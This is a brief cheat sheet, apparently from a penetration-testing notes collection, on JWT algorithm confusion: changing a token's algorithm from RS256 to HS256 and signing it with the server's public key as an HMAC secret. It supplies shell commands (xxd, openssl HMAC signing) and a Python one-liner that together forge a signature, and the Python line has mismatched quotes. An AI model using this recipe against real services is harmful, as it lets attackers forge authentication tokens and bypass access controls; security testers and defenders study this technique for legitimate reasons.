# JWT exploitation using public key \(TLDR\)

> Change the algorithm \(RS256 â†’ HS256\) and sign a new secret

- Change the algorithm inside the JWT header
- Convert the public key to hex so openssl will use it
```bash
cat key | xxd -p | tr -d "\\n"
```

- Use openssl to sign that as a valid HS256 key.
```bash
echo -n <TOKEN> | openssl dgst -sha256 -mac HMAC -macopt hexkey:<KEY>
```

- Decode that hex to binary data, and reencode it in base64
```bash
python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('<SECRET>')).replace('=','')\")""
```

- Replace the secret inside the JWT token.

